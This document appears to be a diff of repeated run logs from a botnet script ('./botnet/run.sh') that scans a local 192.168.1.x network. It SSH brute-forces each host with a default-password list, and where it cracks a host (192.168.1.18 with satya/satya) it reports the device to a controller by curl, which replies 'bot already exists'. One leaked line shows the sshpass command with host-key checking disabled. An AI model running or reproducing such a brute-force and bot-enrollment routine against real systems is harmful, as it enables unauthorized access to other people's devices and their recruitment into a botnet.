+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.18
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   4901   5670 --:--:-- --:--:-- --:--:--  6555
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.18
+192.168.1.4
+192.168.1.6
+192.168.1.7
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  11910  13778 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.18
+192.168.1.6
+192.168.1.7
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  10208  11809 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.7
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.7
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.18
+192.168.1.6
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  12814  14824 --:--:-- --:--:-- --:--:-- 19666
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.2
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.2
+
+
+
+Completed!!
+IP , User name , Passwords are
+192.168.1.18,satya,satya
+about to retart in few seconds
+
+
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.1.4
+192.168.1.6
+192.168.1.18
+192.168.1.5
+192.168.1.2
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.1.4
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.4
+
+
+
+Brute forcing the device with IP 192.168.1.6
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+trying NA and NA.
+
+user name and password not found for 192.168.1.6
+
+
+
+Brute forcing the device with IP 192.168.1.18
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying pi and 123456789.
+trying admin and 54321.
+trying satya and satya.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59  10177  11774 --:--:-- --:--:-- --:--:-- 14750
+{
+  "code": 200, 
+  "data": "bot already exists"
+}
+192.168.1.18,satya,satya added
 
 
 Brute forcing the device with IP 192.168.1.5
 trying admin and 1111111.
-trying admin and 1234.
-./botnet/run.sh: line 40: 28226 Terminated              sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &> /dev/null
-trying admin and admin1234.
-trying admin and 12345.
-./botnet/run.sh: line 40: 28338 Terminated              sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &> /dev/null
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.5
-
-
-
-Brute forcing the device with IP 192.168.1.4
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.4
-
-
-
-Brute forcing the device with IP 192.168.1.9
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.9
-
-
-
-Brute forcing the device with IP 192.168.1.7
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.7
-
-
-
-Completed!!
-IP , User name , Passwords are
-about to retart in few seconds
-
-
-
-
-running the script for the 1 th time
-
-
-Scanning the Network
-
-
-Devices on the network
-192.168.1.18
-192.168.1.9
-192.168.1.2
-192.168.1.3
-192.168.1.4
-192.168.1.7
-
-
-SSH attempt
-
-Brute forcing the device with IP 192.168.1.18
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   1290   4228 --:--:-- --:--:-- --:--:--  5900
-{
-  "code": 200
-}
-192.168.1.18,satya,satya added
-
-
-Brute forcing the device with IP 192.168.1.9
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.9
-
-
-
-Brute forcing the device with IP 192.168.1.2
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.2
-
-
-
-Brute forcing the device with IP 192.168.1.3
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.3
-
-
-
-Brute forcing the device with IP 192.168.1.4
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.4
-
-
-
-Brute forcing the device with IP 192.168.1.7
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.7
-
-
-
-Completed!!
-IP , User name , Passwords are
-192.168.1.18,satya,satya
-about to retart in few seconds
-
-
-
-
-running the script for the 1 th time
-
-
-Scanning the Network
-
-
-Devices on the network
-192.168.1.18
-192.168.1.2
-192.168.1.3
-192.168.1.9
-192.168.1.4
-192.168.1.7
-
-
-SSH attempt
-
-Brute forcing the device with IP 192.168.1.18
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   7407   8569 --:--:-- --:--:-- --:--:--  9833
-{
-  "code": 200, 
-  "data": "bot already exists"
-}
-192.168.1.18,satya,satya added
-
-
-Brute forcing the device with IP 192.168.1.2
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.2
-
-
-
-Brute forcing the device with IP 192.168.1.3
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.3
-
-
-
-Brute forcing the device with IP 192.168.1.9
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.9
-
-
-
-Brute forcing the device with IP 192.168.1.4
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.4
-
-
-
-Brute forcing the device with IP 192.168.1.7
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.7
-
-
-
-Completed!!
-IP , User name , Passwords are
-192.168.1.18,satya,satya
-about to retart in few seconds
-
-
-
-
-running the script for the 1 th time
-
-
-Scanning the Network
-
-
-Devices on the network
-192.168.1.18
-192.168.1.2
-192.168.1.9
-192.168.1.3
-192.168.1.4
-192.168.1.7
-
-
-SSH attempt
-
-Brute forcing the device with IP 192.168.1.18
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   6567   7598 --:--:-- --:--:-- --:--:--  8428
-{
-  "code": 200, 
-  "data": "bot already exists"
-}
-192.168.1.18,satya,satya added
-
-
-Brute forcing the device with IP 192.168.1.2
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.2
-
-
-
-Brute forcing the device with IP 192.168.1.9
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.9
-
-
-
-Brute forcing the device with IP 192.168.1.3
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.3
-
-
-
-Brute forcing the device with IP 192.168.1.4
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.4
-
-
-
-Brute forcing the device with IP 192.168.1.7
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
-trying admin and 12345.
-trying pi and 123456789.
-trying admin and 54321.
-trying satya and satya.
-trying NA and NA.
-
-user name and password not found for 192.168.1.7
-
-
-
-Completed!!
-IP , User name , Passwords are
-192.168.1.18,satya,satya
-about to retart in few seconds
-
-
-
-
-running the script for the 1 th time
-
-
-Scanning the Network
-
-
-Devices on the network
-192.168.1.18
-192.168.1.4
-192.168.1.2
-192.168.1.3
-192.168.1.9
-192.168.1.7
-
-
-SSH attempt
-
-Brute forcing the device with IP 192.168.1.18
-trying admin and 1111111.
-trying admin and 1234.
-trying admin and admin1234.
